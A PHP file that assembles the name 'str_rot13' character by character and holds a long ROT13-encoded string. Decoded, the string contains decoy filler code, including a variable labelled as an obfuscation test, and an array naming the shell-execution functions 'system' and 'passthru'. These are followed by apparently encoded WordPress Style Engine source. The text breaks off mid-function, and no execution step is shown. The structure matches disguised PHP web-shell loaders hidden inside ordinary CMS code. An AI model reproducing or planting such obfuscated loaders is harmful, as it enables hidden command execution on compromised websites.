<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fglyr Ratvar: JC_Fglyr_Ratvar pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 */

/**
 * Gur znva pynff vagrtengvat nyy bgure JC_Fglyr_Ratvar_* pynffrf.
 *
 * Gur Fglyr Ratvar nvzf gb cebivqr n pbafvfgrag NCV sbe eraqrevat fglyvat sbe oybpxf
 * npebff obgu pyvrag-fvqr naq freire-fvqr nccyvpngvbaf.
 *
 * Guvf pynff vf svany naq fubhyq abg or rkgraqrq.
 *
 * Guvf pynff vf sbe vagreany Pber hfntr naq vf abg fhccbfrq gb or hfrq ol rkgraqref
 * (cyhtvaf naq/be gurzrf). Guvf vf n ybj-yriry NCV gung znl arrq gb qb oernxvat punatrf.
 * Cyrnfr, hfr jc_fglyr_ratvar_trg_fglyrf() vafgrnq.
 *
 * @npprff cevingr
 * @fvapr 6.1.0
 * @fvapr 6.3.0 Nqqrq fhccbeg sbe grkg-pbyhzaf.
 * @fvapr 6.4.0 Nqqrq fhccbeg sbe onpxtebhaq.onpxtebhaqVzntr.
 * @fvapr 6.5.0 Nqqrq fhccbeg sbe onpxtebhaq.onpxtebhaqCbfvgvba,
 *              onpxtebhaq.onpxtebhaqErcrng naq qvzrafvbaf.nfcrpgEngvb.
 * @fvapr 6.7.0 Nqqrq fhccbeg sbe glcbtencul.jevgvatZbqr.
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Fglyr_Ratvar {
	/**
	 * Fglyr qrsvavgvbaf gung pbagnva gur vafgehpgvbaf gb cnefr/bhgchg inyvq Thgraoret fglyrf sebz n oybpx'f nggevohgrf.
	 *
	 * Sbe rirel fglyr qrsvavgvba, gur sbyybjvat cebcregvrf ner inyvq:
	 *
	 *  - pynffanzrf    => (neenl) na neenl bs pynffanzrf gb or erghearq sbe oybpx fglyrf. Gur xrl vf n pynffanzr be cnggrea.
	 *                    N inyhr bs `gehr` zrnaf gur pynffanzr fubhyq or nccyvrq nyjnlf. Bgurejvfr, n inyvq PFF cebcregl (fgevat)
	 *                    gb zngpu gur vapbzvat inyhr, r.t., \"pbybe\" gb zngpu ine:cerfrg|pbybe|fbzrCerfrgFyht.
	 *  - pff_inef      => (neenl) na neenl bs xrl inyhr cnvef hfrq gb trarengr PFF ine inyhrf.
	 *                     Gur xrl fubhyq or gur PFF cebcregl anzr gung zngpurf gur frpbaq ryrzrag bs gur cerfrg fgevat inyhr,
	 *                     v.r., \"pbybe\" va ine:cerfrg|pbybe|fbzrCerfrgFyht. Gur inyhr vf n PFF ine cnggrea (r.t. `--jc--cerfrg--pbybe--$fyht`),
	 *                     jubfr `$fyht` sentzrag jvyy or ercynprq jvgu gur cerfrg fyht, juvpu vf gur guveq ryrzrag bs gur cerfrg fgevat inyhr,
	 *                     v.r., `fbzrCerfrgFyht` va ine:cerfrg|pbybe|fbzrCerfrgFyht.
	 *  - cebcregl_xrlf => (neenl) neenl bs xrlf jubfr inyhrf ercerfrag n inyvq PFF cebcregl, r.t., \"znetva\" be \"obeqre\".
	 *  - cngu          => (neenl) n cngu gung npprffrf gur pbeerfcbaqvat fglyr inyhr va gur oybpx fglyr bowrpg.
	 *  - inyhr_shap    => (fgevat) gur anzr bs n shapgvba gb trarengr n PFF qrsvavgvba neenl sbe n cnegvphyne fglyr bowrpg. Gur bhgchg bs guvf shapgvba fubhyq or `neenl( \"$cebcregl\" => \"$inyhr\", ... )`.
	 *
	 * @fvapr 6.1.0
	 * @ine neenl
	 */
	pbafg OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN = neenl(
		'onpxtebhaq' => neenl(
			'onpxtebhaqVzntr'      => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'onpxtebhaq-vzntr',
				),
				'inyhr_shap'    => neenl( frys::pynff, 'trg_hey_be_inyhr_pff_qrpynengvba' ),
				'cngu'          => neenl( 'onpxtebhaq', 'onpxtebhaqVzntr' ),
			),
			'onpxtebhaqCbfvgvba'   => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'onpxtebhaq-cbfvgvba',
				),
				'cngu'          => neenl( 'onpxtebhaq', 'onpxtebhaqCbfvgvba' ),
			),
			'onpxtebhaqErcrng'     => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'onpxtebhaq-ercrng',
				),
				'cngu'          => neenl( 'onpxtebhaq', 'onpxtebhaqErcrng' ),
			),
			'onpxtebhaqFvmr'       => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'onpxtebhaq-fvmr',
				),
				'cngu'          => neenl( 'onpxtebhaq', 'onpxtebhaqFvmr' ),
			),
			'onpxtebhaqNggnpuzrag' => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'onpxtebhaq-nggnpuzrag',
				),
				'cngu'          => neenl( 'onpxtebhaq', 'onpxtebhaqNggnpuzrag' ),
			),
		),
		'pbybe'      => neenl(
			'grkg'       => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'pbybe',
				),
				'cngu'          => neenl( 'pbybe', 'grkg' ),
				'pff_inef'      => neenl(
					'pbybe' => '--jc--cerfrg--pbybe--$fyht',
				),
				'pynffanzrf'    => neenl(
					'unf-grkg-pbybe'  => gehr,
					'unf-$fyht-pbybe' => 'pbybe',
				),
			),
			'onpxtebhaq' => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'onpxtebhaq-pbybe',
				),
				'cngu'          => neenl( 'pbybe', 'onpxtebhaq' ),
				'pff_inef'      => neenl(
					'pbybe' => '--jc--cerfrg--pbybe--$fyht',
				),
				'pynffanzrf'    => neenl(
					'unf-onpxtebhaq'             => gehr,
					'unf-$fyht-onpxtebhaq-pbybe' => 'pbybe',
				),
			),
			'tenqvrag'   => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'onpxtebhaq',
				),
				'cngu'          => neenl( 'pbybe', 'tenqvrag' ),
				'pff_inef'      => neenl(
					'tenqvrag' => '--jc--cerfrg--tenqvrag--$fyht',
				),
				'pynffanzrf'    => neenl(
					'unf-onpxtebhaq'                => gehr,
					'unf-$fyht-tenqvrag-onpxtebhaq' => 'tenqvrag',
				),
			),
		),
		'obeqre'     => neenl(
			'pbybe'  => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg'    => 'obeqre-pbybe',
					'vaqvivqhny' => 'obeqre-%f-pbybe',
				),
				'cngu'          => neenl( 'obeqre', 'pbybe' ),
				'pynffanzrf'    => neenl(
					'unf-obeqre-pbybe'       => gehr,
					'unf-$fyht-obeqre-pbybe' => 'pbybe',
				),
			),
			'enqvhf' => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg'    => 'obeqre-enqvhf',
					'vaqvivqhny' => 'obeqre-%f-enqvhf',
				),
				'cngu'          => neenl( 'obeqre', 'enqvhf' ),
			),
			'fglyr'  => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg'    => 'obeqre-fglyr',
					'vaqvivqhny' => 'obeqre-%f-fglyr',
				),
				'cngu'          => neenl( 'obeqre', 'fglyr' ),
			),
			'jvqgu'  => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg'    => 'obeqre-jvqgu',
					'vaqvivqhny' => 'obeqre-%f-jvqgu',
				),
				'cngu'          => neenl( 'obeqre', 'jvqgu' ),
			),
			'gbc'    => neenl(
				'inyhr_shap' => neenl( frys::pynff, 'trg_vaqvivqhny_cebcregl_pff_qrpynengvbaf' ),
				'cngu'       => neenl( 'obeqre', 'gbc' ),
				'pff_inef'   => neenl(
					'pbybe' => '--jc--cerfrg--pbybe--$fyht',
				),
			),
			'evtug'  => neenl(
				'inyhr_shap' => neenl( frys::pynff, 'trg_vaqvivqhny_cebcregl_pff_qrpynengvbaf' ),
				'cngu'       => neenl( 'obeqre', 'evtug' ),
				'pff_inef'   => neenl(
					'pbybe' => '--jc--cerfrg--pbybe--$fyht',
				),
			),
			'obggbz' => neenl(
				'inyhr_shap' => neenl( frys::pynff, 'trg_vaqvivqhny_cebcregl_pff_qrpynengvbaf' ),
				'cngu'       => neenl( 'obeqre', 'obggbz' ),
				'pff_inef'   => neenl(
					'pbybe' => '--jc--cerfrg--pbybe--$fyht',
				),
			),
			'yrsg'   => neenl(
				'inyhr_shap' => neenl( frys::pynff, 'trg_vaqvivqhny_cebcregl_pff_qrpynengvbaf' ),
				'cngu'       => neenl( 'obeqre', 'yrsg' ),
				'pff_inef'   => neenl(
					'pbybe' => '--jc--cerfrg--pbybe--$fyht',
				),
			),
		),
		'funqbj'     => neenl(
			'funqbj' => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'obk-funqbj',
				),
				'cngu'          => neenl( 'funqbj' ),
				'pff_inef'      => neenl(
					'funqbj' => '--jc--cerfrg--funqbj--$fyht',
				),
			),
		),
		'qvzrafvbaf' => neenl(
			'nfcrpgEngvb' => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'nfcrpg-engvb',
				),
				'cngu'          => neenl( 'qvzrafvbaf', 'nfcrpgEngvb' ),
				'pynffanzrf'    => neenl(
					'unf-nfcrpg-engvb' => gehr,
				),
			),
			'zvaUrvtug'   => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'zva-urvtug',
				),
				'cngu'          => neenl( 'qvzrafvbaf', 'zvaUrvtug' ),
				'pff_inef'      => neenl(
					'fcnpvat' => '--jc--cerfrg--fcnpvat--$fyht',
				),
			),
		),
		'fcnpvat'    => neenl(
			'cnqqvat' => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg'    => 'cnqqvat',
					'vaqvivqhny' => 'cnqqvat-%f',
				),
				'cngu'          => neenl( 'fcnpvat', 'cnqqvat' ),
				'pff_inef'      => neenl(
					'fcnpvat' => '--jc--cerfrg--fcnpvat--$fyht',
				),
			),
			'znetva'  => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg'    => 'znetva',
					'vaqvivqhny' => 'znetva-%f',
				),
				'cngu'          => neenl( 'fcnpvat', 'znetva' ),
				'pff_inef'      => neenl(
					'fcnpvat' => '--jc--cerfrg--fcnpvat--$fyht',
				),
			),
		),
		'glcbtencul' => neenl(
			'sbagFvmr'       => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'sbag-fvmr',
				),
				'cngu'          => neenl( 'glcbtencul', 'sbagFvmr' ),
				'pff_inef'      => neenl(
					'sbag-fvmr' => '--jc--cerfrg--sbag-fvmr--$fyht',
				),
				'pynffanzrf'    => neenl(
					'unf-$fyht-sbag-fvmr' => 'sbag-fvmr',
				),
			),
			'sbagSnzvyl'     => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'sbag-snzvyl',
				),
				'pff_inef'      => neenl(
					'sbag-snzvyl' => '--jc--cerfrg--sbag-snzvyl--$fyht',
				),
				'cngu'          => neenl( 'glcbtencul', 'sbagSnzvyl' ),
				'pynffanzrf'    => neenl(
					'unf-$fyht-sbag-snzvyl' => 'sbag-snzvyl',
				),
			),
			'sbagFglyr'      => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'sbag-fglyr',
				),
				'cngu'          => neenl( 'glcbtencul', 'sbagFglyr' ),
			),
			'sbagJrvtug'     => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'sbag-jrvtug',
				),
				'cngu'          => neenl( 'glcbtencul', 'sbagJrvtug' ),
			),
			'yvarUrvtug'     => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'yvar-urvtug',
				),
				'cngu'          => neenl( 'glcbtencul', 'yvarUrvtug' ),
			),
			'grkgPbyhzaf'    => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'pbyhza-pbhag',
				),
				'cngu'          => neenl( 'glcbtencul', 'grkgPbyhzaf' ),
			),
			'grkgQrpbengvba' => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'grkg-qrpbengvba',
				),
				'cngu'          => neenl( 'glcbtencul', 'grkgQrpbengvba' ),
			),
			'grkgGenafsbez'  => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'grkg-genafsbez',
				),
				'cngu'          => neenl( 'glcbtencul', 'grkgGenafsbez' ),
			),
			'yrggreFcnpvat'  => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'yrggre-fcnpvat',
				),
				'cngu'          => neenl( 'glcbtencul', 'yrggreFcnpvat' ),
			),
			'jevgvatZbqr'    => neenl(
				'cebcregl_xrlf' => neenl(
					'qrsnhyg' => 'jevgvat-zbqr',
				),
				'cngu'          => neenl( 'glcbtencul', 'jevgvatZbqr' ),
			),
		),
	);

	/**
	 * Hgvy: Rkgenpgf gur fyht va xrono pnfr sebz n cerfrg fgevat,
	 * r.t. `urnirayl-oyhr` sebz `ine:cerfrg|pbybe|urniraylOyhr`.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $fglyr_inyhr  N fvatyr PFF cerfrg inyhr.
	 * @cnenz fgevat $cebcregl_xrl Gur PFF cebcregl gung vf gur frpbaq ryrzrag bs gur cerfrg fgevat.
	 *                             Hfrq sbe zngpuvat.
	 * @erghea fgevat Gur fyht, be rzcgl fgevat vs abg sbhaq.
	 */
	cebgrpgrq fgngvp shapgvba trg_fyht_sebz_cerfrg_inyhr( $fglyr_inyhr, $cebcregl_xrl ) {
		vs ( vf_fgevat( $fglyr_inyhr ) && vf_fgevat( $cebcregl_xrl )
			&& fge_pbagnvaf( $fglyr_inyhr, \"ine:cerfrg|{$cebcregl_xrl}|\" )
		) {
			$vaqrk_gb_fcyvpr = fgeecbf( $fglyr_inyhr, '|' ) + 1;
			erghea _jc_gb_xrono_pnfr( fhofge( $fglyr_inyhr, $vaqrk_gb_fcyvpr ) );
		}
		erghea '';
	}

	/**
	 * Hgvy: Trarengrf n PFF ine fgevat, r.t. `ine(--jc--cerfrg--pbybe--onpxtebhaq)`
	 * sebz n cerfrg fgevat fhpu nf `ine:cerfrg|fcnpr|50`.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat   $fglyr_inyhr  N fvatyr PFF cerfrg inyhr.
	 * @cnenz fgevat[] $pff_inef     Na nffbpvngr neenl bs PFF ine cnggreaf
	 *                               hfrq gb trarengr gur ine fgevat.
	 * @erghea fgevat Gur PFF ine, be na rzcgl fgevat vs ab zngpu sbe fyht sbhaq.
	 */
	cebgrpgrq fgngvp shapgvba trg_pff_ine_inyhr( $fglyr_inyhr, $pff_inef ) {
		sbernpu ( $pff_inef nf $cebcregl_xrl => $pff_ine_cnggrea ) {
			$fyht = fgngvp::trg_fyht_sebz_cerfrg_inyhr( $fglyr_inyhr, $cebcregl_xrl );
			vs ( fgngvp::vf_inyvq_fglyr_inyhr( $fyht ) ) {
				$ine = fgege(
					$pff_ine_cnggrea,
					neenl( '$fyht' => $fyht )
				);
				erghea \"ine($ine)\";
			}
		}
		erghea '';
	}

	/**
	 * Hgvy: Purpxf jurgure na vapbzvat oybpx fglyr inyhr vf inyvq.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $fglyr_inyhr N fvatyr PFF cerfrg inyhr.
	 * @erghea obby
	 */
	cebgrpgrq fgngvp shapgvba vf_inyvq_fglyr_inyhr( $fglyr_inyhr ) {
		erghea '0' === $fglyr_inyhr || ! rzcgl( $fglyr_inyhr );
	}

	/**
	 * Fgberf n PFF ehyr hfvat gur cebivqrq PFF fryrpgbe naq PFF qrpynengvbaf.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.6.0 Nqqrq gur `$ehyrf_tebhc` cnenzrgre.
	 *
	 * @cnenz fgevat   $fgber_anzr       N inyvq fgber xrl.
	 * @cnenz fgevat   $pff_fryrpgbe     Jura n fryrpgbe vf cnffrq, gur shapgvba jvyy erghea
	 *                                   n shyy PFF ehyr `$fryrpgbe { ...ehyrf }`
	 *                                   bgurejvfr n pbapngrangrq fgevat bs cebcregvrf naq inyhrf.
	 * @cnenz fgevat[] $pff_qrpynengvbaf Na nffbpvngvir neenl bs PFF qrsvavgvbaf,
	 *                                   r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`.
	 * @cnenz fgevat $ehyrf_tebhc        Bcgvbany. N cnerag PFF fryrpgbe va gur pnfr bs arfgrq PFF, be n PFF arfgrq @ehyr,
	 *                                   fhpu nf `@zrqvn (zva-jvqgu: 80erz)` be `@ynlre zbqhyr`.
	 */
	choyvp fgngvp shapgvba fgber_pff_ehyr( $fgber_anzr, $pff_fryrpgbe, $pff_qrpynengvbaf, $ehyrf_tebhc = '' ) {
		vs ( rzcgl( $fgber_anzr ) || rzcgl( $pff_fryrpgbe ) || rzcgl( $pff_qrpynengvbaf ) ) {
			erghea;
		}
		fgngvp::trg_fgber( $fgber_anzr )->nqq_ehyr( $pff_fryrpgbe, $ehyrf_tebhc )->nqq_qrpynengvbaf( $pff_qrpynengvbaf );
	}

	/**
	 * Ergheaf n fgber ol fgber xrl.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $fgber_anzr N fgber xrl.
	 * @erghea JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber|ahyy
	 */
	choyvp fgngvp shapgvba trg_fgber( $fgber_anzr ) {
		erghea JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( $fgber_anzr );
	}

	/**
	 * Ergheaf pynffanzrf naq PFF onfrq ba gur inyhrf va n fglyrf bowrpg.
	 *
	 * Erghea inyhrf ner cnefrq onfrq ba gur vafgehpgvbaf va OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz neenl $oybpx_fglyrf Gur fglyr bowrpg.
	 * @cnenz neenl $bcgvbaf      {
	 *     Bcgvbany. Na neenl bs bcgvbaf. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby        $pbaireg_inef_gb_pynffanzrf Jurgure gb fxvc pbairegvat vapbzvat PFF ine cnggreaf,
	 *                                                   r.t. `ine:cerfrg|<CERFRG_GLCR>|<CERFRG_FYHT>`,
	 *                                                   gb `ine( --jc--cerfrg--* )` inyhrf. Qrsnhyg snyfr.
	 *     @glcr fgevat      $fryrpgbe                   Bcgvbany. Jura n fryrpgbe vf cnffrq,
	 *                                                   gur inyhr bs `$pff` va gur erghea inyhr jvyy pbzcevfr
	 *                                                   n shyy PFF ehyr `$fryrpgbe { ...$pff_qrpynengvbaf }`,
	 *                                                   bgurejvfr, gur inyhr jvyy or n pbapngrangrq fgevat
	 *                                                   bs PFF qrpynengvbaf.
	 * }
	 * @erghea neenl {
	 *     @glcr fgevat[] $pynffanzrf   Neenl bs pynff anzrf.
	 *     @glcr fgevat[] $qrpynengvbaf Na nffbpvngvir neenl bs PFF qrsvavgvbaf,
	 *                                  r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`.
	 * }
	 */
	choyvp fgngvp shapgvba cnefr_oybpx_fglyrf( $oybpx_fglyrf, $bcgvbaf ) {
		$cnefrq_fglyrf = neenl(
			'pynffanzrf'   => neenl(),
			'qrpynengvbaf' => neenl(),
		);
		vs ( rzcgl( $oybpx_fglyrf ) || ! vf_neenl( $oybpx_fglyrf ) ) {
			erghea $cnefrq_fglyrf;
		}

		// Pbyyrpg PFF naq pynffanzrf.
		sbernpu ( fgngvp::OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN nf $qrsvavgvba_tebhc_xrl => $qrsvavgvba_tebhc_fglyr ) {
			vs ( rzcgl( $oybpx_fglyrf[ $qrsvavgvba_tebhc_xrl ] ) ) {
				pbagvahr;
			}
			sbernpu ( $qrsvavgvba_tebhc_fglyr nf $fglyr_qrsvavgvba ) {
				$fglyr_inyhr = _jc_neenl_trg( $oybpx_fglyrf, $fglyr_qrsvavgvba['cngu'], ahyy );

				vs ( ! fgngvp::vf_inyvq_fglyr_inyhr( $fglyr_inyhr ) ) {
					pbagvahr;
				}

				$pynffanzrf = fgngvp::trg_pynffanzrf( $fglyr_inyhr, $fglyr_qrsvavgvba );
				vs ( ! rzcgl( $pynffanzrf ) ) {
					$cnefrq_fglyrf['pynffanzrf'] = neenl_zretr( $cnefrq_fglyrf['pynffanzrf'], $pynffanzrf );
				}

				$pff_qrpynengvbaf = fgngvp::trg_pff_qrpynengvbaf( $fglyr_inyhr, $fglyr_qrsvavgvba, $bcgvbaf );
				vs ( ! rzcgl( $pff_qrpynengvbaf ) ) {
					$cnefrq_fglyrf['qrpynengvbaf'] = neenl_zretr( $cnefrq_fglyrf['qrpynengvbaf'], $pff_qrpynengvbaf );
				}
			}
		}

		erghea $cnefrq_fglyrf;
	}

	/**
	 * Ergheaf pynffanzrf, naq trarengrf pynffanzr(f) sebz n PFF cerfrg cebcregl cnggrea,
	 * r.t. `ine:cerfrg|<CERFRG_GLCR>|<CERFRG_FYHT>`.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $fglyr_inyhr      N fvatyr enj fglyr inyhr be PFF cerfrg cebcregl
	 *                                 sebz gur `$oybpx_fglyrf` neenl.
	 * @cnenz neenl  $fglyr_qrsvavgvba N fvatyr fglyr qrsvavgvba sebz OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN.
	 * @erghea fgevat[] Na neenl bs PFF pynffanzrf, be rzcgl neenl vs gurer ner abar.
	 */
	cebgrpgrq fgngvp shapgvba trg_pynffanzrf( $fglyr_inyhr, $fglyr_qrsvavgvba ) {
		vs ( rzcgl( $fglyr_inyhr ) ) {
			erghea neenl();
		}

		$pynffanzrf = neenl();
		vs ( ! rzcgl( $fglyr_qrsvavgvba['pynffanzrf'] ) ) {
			sbernpu ( $fglyr_qrsvavgvba['pynffanzrf'] nf $pynffanzr => $cebcregl_xrl ) {
				vs ( gehr === $cebcregl_xrl ) {
					$pynffanzrf[] = $pynffanzr;
					pbagvahr;
				}

				$fyht = fgngvp::trg_fyht_sebz_cerfrg_inyhr( $fglyr_inyhr, $cebcregl_xrl );

				vs ( $fyht ) {
					/*
					 * Evtug abj jr rkcrpg n pynffanzr cnggrea gb or fgberq va OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN.
					 * Bar qnl, vs gurer ner ab fgberq fpurzngn, jr pbhyq nyybj phfgbz cnggreaf be
					 * trarengr pynffanzrf onfrq ba bgure cebcregvrf
					 * fhpu nf n cngu be n inyhr be n cersvk cnffrq va bcgvbaf.
					 */
					$pynffanzrf[] = fgege( $pynffanzr, neenl( '$fyht' => $fyht ) );
				}
			}
		}

		erghea $pynffanzrf;
	}

	/**
	 * Ergheaf na neenl bs PFF qrpynengvbaf onfrq ba inyvq oybpx fglyr inyhrf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz zvkrq $fglyr_inyhr      N fvatyr enj fglyr inyhr sebz $oybpx_fglyrf neenl.
	 * @cnenz neenl $fglyr_qrsvavgvba N fvatyr fglyr qrsvavgvba sebz OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN.
	 * @cnenz neenl $bcgvbaf          {
	 *     Bcgvbany. Na neenl bs bcgvbaf. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $pbaireg_inef_gb_pynffanzrf Jurgure gb fxvc pbairegvat vapbzvat PFF ine cnggreaf,
	 *                                            r.t. `ine:cerfrg|<CERFRG_GLCR>|<CERFRG_FYHT>`,
	 *                                            gb `ine( --jc--cerfrg--* )` inyhrf. Qrsnhyg snyfr.
	 * }
	 * @erghea fgevat[] Na nffbpvngvir neenl bs PFF qrsvavgvbaf, r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`.
	 */
	cebgrpgrq fgngvp shapgvba trg_pff_qrpynengvbaf( $fglyr_inyhr, $fglyr_qrsvavgvba, $bcgvbaf = neenl() ) {
		vs ( vffrg( $fglyr_qrsvavgvba['inyhr_shap'] ) && vf_pnyynoyr( $fglyr_qrsvavgvba['inyhr_shap'] ) ) {
			erghea pnyy_hfre_shap( $fglyr_qrsvavgvba['inyhr_shap'], $fglyr_inyhr, $fglyr_qrsvavgvba, $bcgvbaf );
		}

		$pff_qrpynengvbaf     = neenl();
		$fglyr_cebcregl_xrlf  = $fglyr_qrsvavgvba['cebcregl_xrlf'];
		$fubhyq_fxvc_pff_inef = vffrg( $bcgvbaf['pbaireg_inef_gb_pynffanzrf'] ) && gehr === $bcgvbaf['pbaireg_inef_gb_pynffanzrf'];

		/*
		 * Ohvyq PFF ine inyhrf sebz `ine:cerfrg|<CERFRG_GLCR>|<CERFRG_FYHT>` inyhrf, r.t, `ine(--jc--pff--ehyr-fyht )`.
		 * Purpx vs gur inyhr vf n PFF cerfrg naq gurer'f n pbeerfcbaqvat pff_ine cnggrea va gur fglyr qrsvavgvba.
		 */
		vs ( vf_fgevat( $fglyr_inyhr ) && fge_pbagnvaf( $fglyr_inyhr, 'ine:' ) ) {
			vs ( ! $fubhyq_fxvc_pff_inef && ! rzcgl( $fglyr_qrsvavgvba['pff_inef'] ) ) {
				$pff_ine = fgngvp::trg_pff_ine_inyhr( $fglyr_inyhr, $fglyr_qrsvavgvba['pff_inef'] );
				vs ( fgngvp::vf_inyvq_fglyr_inyhr( $pff_ine ) ) {
					$pff_qrpynengvbaf[ $fglyr_cebcregl_xrlf['qrsnhyg'] ] = $pff_ine;
				}
			}
			erghea $pff_qrpynengvbaf;
		}

		/*
		 * Qrsnhyg ehyr ohvyqre.
		 * Vs gur vachg pbagnvaf na neenl, nffhzr obk zbqry-yvxr cebcregvrf
		 * sbe fglyrf fhpu nf znetvaf naq cnqqvat.
		 */
		vs ( vf_neenl( $fglyr_inyhr ) ) {
			// Onvy bhg rneyl vs gur `'vaqvivqhny'` cebcregl vf abg qrsvarq.
			vs ( ! vffrg( $fglyr_cebcregl_xrlf['vaqvivqhny'] ) ) {
				erghea $pff_qrpynengvbaf;
			}

			sbernpu ( $fglyr_inyhr nf $xrl => $inyhr ) {
				vs ( vf_fgevat( $inyhr ) && fge_pbagnvaf( $inyhr, 'ine:' ) && ! $fubhyq_fxvc_pff_inef && ! rzcgl( $fglyr_qrsvavgvba['pff_inef'] ) ) {
					$inyhr = fgngvp::trg_pff_ine_inyhr( $inyhr, $fglyr_qrsvavgvba['pff_inef'] );
				}

				$vaqvivqhny_cebcregl = fcevags( $fglyr_cebcregl_xrlf['vaqvivqhny'], _jc_gb_xrono_pnfr( $xrl ) );

				vs ( $vaqvivqhny_cebcregl && fgngvp::vf_inyvq_fglyr_inyhr( $inyhr ) ) {
					$pff_qrpynengvbaf[ $vaqvivqhny_cebcregl ] = $inyhr;
				}
			}

			erghea $pff_qrpynengvbaf;
		}

		$pff_qrpynengvbaf[ $fglyr_cebcregl_xrlf['qrsnhyg'] ] = $fglyr_inyhr;
		erghea $pff_qrpynengvbaf;
	}

	/**
	 * Fglyr inyhr cnefre gung ergheaf n PFF qrsvavgvba neenl pbzcevfvat fglyr cebcregvrf
	 * gung unir xrlf ercerfragvat vaqvivqhny fglyr cebcregvrf, bgurejvfr xabja nf ybatunaq PFF cebcregvrf.
	 *
	 * Rknzcyr:
	 *
	 *     \"$fglyr_cebcregl-$vaqvivqhny_srngher: $inyhr;\"
	 *
	 * Juvpu pbhyq ercerfrag gur sbyybjvat:
	 *
	 *     \"obeqre-{gbc|evtug|obggbz|yrsg}-{pbybe|jvqgu|fglyr}: {inyhr};\"
	 *
	 * be:
	 *
	 *     \"obeqre-vzntr-{bhgfrg|fbhepr|jvqgu|ercrng|fyvpr}: {inyhr};\"
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz neenl $fglyr_inyhr                    N fvatyr enj fglyr inyhr sebz `$oybpx_fglyrf` neenl.
	 * @cnenz neenl $vaqvivqhny_cebcregl_qrsvavgvba N fvatyr fglyr qrsvavgvba sebz OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN
	 *                                              ercerfragvat na vaqvivqhny cebcregl bs n PFF cebcregl,
	 *                                              r.t. 'gbc' va 'obeqre-gbc'.
	 * @cnenz neenl $bcgvbaf                        {
	 *     Bcgvbany. Na neenl bs bcgvbaf. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $pbaireg_inef_gb_pynffanzrf Jurgure gb fxvc pbairegvat vapbzvat PFF ine cnggreaf,
	 *                                            r.t. `ine:cerfrg|<CERFRG_GLCR>|<CERFRG_FYHT>`,
	 *                                            gb `ine( --jc--cerfrg--* )` inyhrf. Qrsnhyg snyfr.
	 * }
	 * @erghea fgevat[] Na nffbpvngvir neenl bs PFF qrsvavgvbaf, r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`.
	 */
	cebgrpgrq fgngvp shapgvba trg_vaqvivqhny_cebcregl_pff_qrpynengvbaf( $fglyr_inyhr, $vaqvivqhny_cebcregl_qrsvavgvba, $bcgvbaf = neenl() ) {
